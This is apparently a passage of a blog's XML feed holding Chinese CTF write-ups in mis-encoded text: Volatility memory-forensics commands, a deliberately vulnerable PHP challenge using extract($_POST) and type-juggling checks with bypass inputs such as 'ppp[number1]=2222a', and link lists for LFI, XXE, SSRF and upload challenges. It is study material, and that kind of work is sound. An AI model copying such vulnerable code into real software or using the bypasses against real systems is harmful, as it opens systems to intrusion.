alt="image-20220120160645562"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¡Œé¢ä¸Šæœ‰flag.zipå’Œflag.pngï¼Œç»Ÿç»Ÿæå–å‡ºæ¥çœ‹ä¸‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 dumpfiles -Q 0x0000000001b34f90 -D ./cab -u</span><br><span class="line">python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 dumpfiles -Q 0x0000000001e65028 -D ./cab -u</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬fileä¸€ä¸‹  æ”¹ä¸‹åå­—  å¥½åŒºåˆ†<br><img src="/images/changanzhanyi/26.png" alt="image-20220120161811945"><br>zipå‹ç¼©åŒ…æ˜¯æœ‰å¯†ç çš„<br><img src="/images/changanzhanyi/27.png" alt="image-20220120162354291"><br>cmdä¸­è¿˜æœ‰ä¸€ä¸ªæ—¥è®°ï¼Œæå‡ºæ¥<img src="/images/changanzhanyi/28.png" alt="image-20220120162811234"><br>çœ‹åˆ°æ˜¯å¯†ç ï¼Œè§£å‹ä¸€ä¸‹ï¼Œé‡Œé¢æ˜¯åŠ å¯†çš„ä»£ç <br><img src="/images/changanzhanyi/29.png" alt="image-20220120162911649"><br><img src="/images/changanzhanyi/30.png" alt="image-20220120162945826"><br>æŠŠflagå›¾ç‰‡é‡Œçš„å†…å®¹æå‡ºæ¥ï¼Œè½¬æ¢ä¸€ä¸‹å°±å‡ºäº†</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> é•¿å®‰æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021å¼ºç½‘æ¯wp</title>
      <link href="/2021/06/24/2021%E5%BC%BA%E7%BD%91%E6%9D%AFwp/"/>
      <url>/2021/06/24/2021%E5%BC%BA%E7%BD%91%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="å¯»å®"><a href="#å¯»å®" class="headerlink" title="å¯»å®"></a>å¯»å®</h2><p>å¼€å±€ç»™äº†æºä»£ç ï¼Œé‚£åº”è¯¥æ˜¯è€ƒå¯Ÿphpçš„ç‰¹æ€§äº†ï¼Œæˆ‘ä»¬ä¸€ç‚¹ä¸€ç‚¹çš„çœ‹ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ppp</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$ppp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;nunber3&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$num1</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num2</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num3</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number3&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num4</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>]);</span><br><span class="line"><span class="variable">$num5</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>]);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;éæ•°å­—&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1</span> &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬ä¸€å±‚&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2</span> + <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ç¬¬äºŒå±‚&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num3</span>) &amp;&amp; <span class="string">&#x27;4bf21cd&#x27;</span> === substr(md5(<span class="variable">$num3</span>),<span class="number">0</span>,<span class="number">7</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ç¬¬ä¸‰å±‚&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(!(<span class="variable">$num4</span> &lt; <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> == <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> &lt;= <span class="number">0</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &gt; <span class="number">6</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &lt; <span class="number">8</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$num4</span>) )&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬å››å±‚&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$num5</span>)||(strlen(<span class="variable">$num5</span>)==<span class="number">0</span>)) <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                    <span class="variable">$b</span>=json_decode(@<span class="variable">$num5</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$y</span> = <span class="variable">$b</span> === <span class="literal">NULL</span>)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$y</span> === <span class="literal">true</span>)&#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬äº”å±‚&quot;</span>;</span><br><span class="line">                                    <span class="keyword">include</span> <span class="string">&#x27;KeY1lhv.php&#x27;</span>;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="variable">$KEY1</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no111&quot;</span>);&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¼€å¤´ç»™æˆ‘ä»¬è¿‡æ»¤äº†ä¸€äº›è¯ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç»™çš„payloadä¸å¯ä»¥æœ‰è¿™äº›å•è¯ï¼Œè¿™é‡Œé¢æ„Ÿè§‰æœ€æœ‰ç”¨çš„å°±æ˜¯<code>000000</code> äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;éæ•°å­—&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1</span> &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬ä¸€å±‚&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¬¬ä¸€å±‚æ˜¯å¿…é¡»è¦è¾“å…¥num1ï¼Œä¸”ä¸èƒ½æ˜¯æ•°å­—ï¼Œæ˜¯æ•°å­—çš„è¯ï¼Œå°±ç›´æ¥è¿›å…¥else<code>die</code>äº†ã€‚<br>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨<code>is_numeric</code>çš„ä¸€ä¸ªç¼ºé™·æ¥åˆ©ç”¨ï¼Œ<code>is_numeric</code>å‡½æ•°åˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—ï¼Œå¦‚æœæ˜¯æ•°å­—è¿”å›1ï¼Œå¦åˆ™è¿”å›0ï¼Œä½†å½“è¾“å…¥çš„å˜é‡æœ‰æ•°å­—å’Œå­—æ¯æ—¶ï¼Œå®ƒä¼šæˆªå–ç¬¬ä¸€ä¸ªå­—æ¯ä¹‹å‰çš„æ•°å­—ï¼Œä¸”è¿”å›0ï¼Œä¸¾ä¸ªæ —å­ï¼Œ<code>is_numeric(1234abc123)</code>ï¼Œè¿™é‡Œå®ƒä¼šå–1234ï¼Œè€Œåé¢çš„abcä»–å°±ä¸è¦äº†ã€‚é‚£è¿™æ ·çš„è¯æˆ‘ä»¬ç¬¬ä¸€å±‚ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€<code>ppp[number1]=2222a</code>ï¼Œåªè¦æ¯”1024å¤§å°±å¯ä»¥äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2</span> + <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;ç¬¬äºŒå±‚&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚ï¼Œå¿…é¡»è¾“å…¥è¾“å…¥num2ä¸”é•¿åº¦å°äºæˆ–ç­‰äº4ä¸”è¿™ä¸ªæ•°åŠ ä¸€è¦å¤§äº500000<br>æ­£å¸¸å››ä½æ•°æœ€å¤§9999æ˜¾ç„¶ä¸å¤§äº500000<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨phpé‡Œçš„ç§‘å­¦è®¡æ•°æ³•ï¼Œ<code>1e3=1*10^3</code>ä¹Ÿå°±æ˜¯è¯´</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> å¼ºç½‘æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆå¤©ç½‘å®‰weekly,10-18å‘¨</title>
      <link href="/2020/09/10/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp10-18/"/>
      <url>/2020/09/10/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp10-18/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬ä¹å‘¨-è¯•ä¸‹phpinfoå§"><a href="#ç¬¬ä¹å‘¨-è¯•ä¸‹phpinfoå§" class="headerlink" title="ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§"></a>ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1WZ4y1H7gt">ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§</a></p><h1 id="ç¬¬åå‘¨-è¯•è¯•åè®®å§"><a href="#ç¬¬åå‘¨-è¯•è¯•åè®®å§" class="headerlink" title="ç¬¬åå‘¨ | è¯•è¯•åè®®å§"></a>ç¬¬åå‘¨ | è¯•è¯•åè®®å§</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1Hz411v7c7">ç¬¬åå‘¨ | è¯•è¯•åè®®å§</a></p><hr><h1 id="ç¬¬åä¸€å‘¨-ç­¾åˆ°èˆ¬çš„åŒ…å«"><a href="#ç¬¬åä¸€å‘¨-ç­¾åˆ°èˆ¬çš„åŒ…å«" class="headerlink" title="ç¬¬åä¸€å‘¨ | ç­¾åˆ°èˆ¬çš„åŒ…å«"></a>ç¬¬åä¸€å‘¨ | ç­¾åˆ°èˆ¬çš„åŒ…å«</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV18v411q7mr">ç¬¬åä¸€å‘¨ | ç­¾åˆ°èˆ¬çš„åŒ…å«</a></p><hr><h1 id="ç¬¬åäºŒå‘¨-easy-LFI"><a href="#ç¬¬åäºŒå‘¨-easy-LFI" class="headerlink" title="ç¬¬åäºŒå‘¨ | easy LFI"></a>ç¬¬åäºŒå‘¨ | easy LFI</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1jD4y1U7Vy">ç¬¬åäºŒå‘¨ | easy LFI</a></p><hr><h1 id="ç¬¬åä¸‰å‘¨-simple-xxe"><a href="#ç¬¬åä¸‰å‘¨-simple-xxe" class="headerlink" title="ç¬¬åä¸‰å‘¨ | simple xxe"></a>ç¬¬åä¸‰å‘¨ | simple xxe</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1eT4y1j7ff/">ç¬¬åä¸‰å‘¨ | simple xxe</a></p><hr><h1 id="ç¬¬åå››å‘¨-blind-xxe"><a href="#ç¬¬åå››å‘¨-blind-xxe" class="headerlink" title="ç¬¬åå››å‘¨ | blind xxe"></a>ç¬¬åå››å‘¨ | blind xxe</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1nK411n7G9/">ç¬¬åå››å‘¨ | blind xxe</a></p><hr><h1 id="ç¬¬åäº”å‘¨-å›æ˜¾çš„SSRF"><a href="#ç¬¬åäº”å‘¨-å›æ˜¾çš„SSRF" class="headerlink" title="ç¬¬åäº”å‘¨ | å›æ˜¾çš„SSRF"></a>ç¬¬åäº”å‘¨ | å›æ˜¾çš„SSRF</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV18f4y197Lz/">ç¬¬åäº”å‘¨ | å›æ˜¾çš„SSRF</a></p><hr><h1 id="ç¬¬åå…­å‘¨-æœ‰ç‚¹å¦ç±»çš„SSRF"><a href="#ç¬¬åå…­å‘¨-æœ‰ç‚¹å¦ç±»çš„SSRF" class="headerlink" title="ç¬¬åå…­å‘¨ | æœ‰ç‚¹å¦ç±»çš„SSRF"></a>ç¬¬åå…­å‘¨ | æœ‰ç‚¹å¦ç±»çš„SSRF</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1g54y1U7Gj/">ç¬¬åå…­å‘¨ | æœ‰ç‚¹å¦ç±»çš„SSRF</a></p><hr><h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>æ‰“æ³¢å¹¿å‘Š,æˆ‘çš„bilibiliä¸»é¡µ<a href="https://space.bilibili.com/454748309">å…³æ³¨æˆ‘</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> åˆå¤©ç½‘å®‰ </tag>
            
            <tag> è§†é¢‘è®²è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆå¤©ç½‘å®‰weekly,1-9å‘¨</title>
      <link href="/2020/05/30/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp1-9/"/>
      <url>/2020/05/30/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp1-9/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="ç¬¬ä¸€å‘¨-ç¥å¥‡çš„ç£å¸¦"><a href="#ç¬¬ä¸€å‘¨-ç¥å¥‡çš„ç£å¸¦" class="headerlink" title="ç¬¬ä¸€å‘¨ | ç¥å¥‡çš„ç£å¸¦"></a>ç¬¬ä¸€å‘¨ | ç¥å¥‡çš„ç£å¸¦</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1DA411q7Go">ç¬¬ä¸€å‘¨ | ç¥å¥‡çš„ç£å¸¦</a></p><hr><h1 id="ç¬¬äºŒå‘¨-å°±å·®ä¸€æŠŠé’¥åŒ™"><a href="#ç¬¬äºŒå‘¨-å°±å·®ä¸€æŠŠé’¥åŒ™" class="headerlink" title="ç¬¬äºŒå‘¨ | å°±å·®ä¸€æŠŠé’¥åŒ™"></a>ç¬¬äºŒå‘¨ | å°±å·®ä¸€æŠŠé’¥åŒ™</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1np4y1X7L5">ç¬¬äºŒå‘¨ | å°±å·®ä¸€æŠŠé’¥åŒ™</a></p><hr><h1 id="ç¬¬ä¸‰å‘¨-è¿·äº†è·¯"><a href="#ç¬¬ä¸‰å‘¨-è¿·äº†è·¯" class="headerlink" title="ç¬¬ä¸‰å‘¨ | è¿·äº†è·¯"></a>ç¬¬ä¸‰å‘¨ | è¿·äº†è·¯</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV16K4y1t7jg">ç¬¬ä¸‰å‘¨ | è¿·äº†è·¯</a></p><hr><h1 id="ç¬¬å››å‘¨-Check-your-source-code"><a href="#ç¬¬å››å‘¨-Check-your-source-code" class="headerlink" title="ç¬¬å››å‘¨ | Check your source code"></a>ç¬¬å››å‘¨ | Check your source code</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1254y1D7Jy">ç¬¬å››å‘¨ | Check your source code</a></p><hr><h1 id="ç¬¬äº”å‘¨-Easy-upload"><a href="#ç¬¬äº”å‘¨-Easy-upload" class="headerlink" title="ç¬¬äº”å‘¨ | Easy upload"></a>ç¬¬äº”å‘¨ | Easy upload</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1KT4y1g7kr">ç¬¬äº”å‘¨ | Easy upload</a></p><hr><h1 id="ç¬¬å…­å‘¨-å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ "><a href="#ç¬¬å…­å‘¨-å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ " class="headerlink" title="ç¬¬å…­å‘¨ | å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ "></a>ç¬¬å…­å‘¨ | å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ </h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1mZ4y1p7vz">ç¬¬å…­å‘¨ | å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ </a></p><hr><h1 id="ç¬¬ä¸ƒå‘¨-å†è§ä¸Šä¼ "><a href="#ç¬¬ä¸ƒå‘¨-å†è§ä¸Šä¼ " class="headerlink" title="ç¬¬ä¸ƒå‘¨ | å†è§ä¸Šä¼ "></a>ç¬¬ä¸ƒå‘¨ | å†è§ä¸Šä¼ </h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1J5411x7Pt">ç¬¬ä¸ƒå‘¨ | å†è§ä¸Šä¼ </a></p><hr><h1 id="ç¬¬å…«å‘¨-éšæ„çš„ä¸Šä¼ "><a href="#ç¬¬å…«å‘¨-éšæ„çš„ä¸Šä¼ " class="headerlink" title="ç¬¬å…«å‘¨ | éšæ„çš„ä¸Šä¼ "></a>ç¬¬å…«å‘¨ | éšæ„çš„ä¸Šä¼ </h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV14K411n7Wx">ç¬¬å…«å‘¨ | éšæ„çš„ä¸Šä¼ </a></p><hr><h1 id="ç¬¬ä¹å‘¨-è¯•ä¸‹phpinfoå§"><a href="#ç¬¬ä¹å‘¨-è¯•ä¸‹phpinfoå§" class="headerlink" title="ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§"></a>ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1WZ4y1H7gt">ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§</a><br><br></p><h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>æ‰“æ³¢å¹¿å‘Š,æˆ‘çš„bilibiliä¸»é¡µ<a href="https://space.bilibili.com/454748309">å…³æ³¨æˆ‘</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> åˆå¤©ç½‘å®‰ </tag>
            
            <tag> è§†é¢‘è®²è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>welcome</title>
      <link href="/2020/05/08/hello/"/>
      <url>/2020/05/08/hello/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="nonono" data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹.">  <script id="hbeData" type="hbeData" 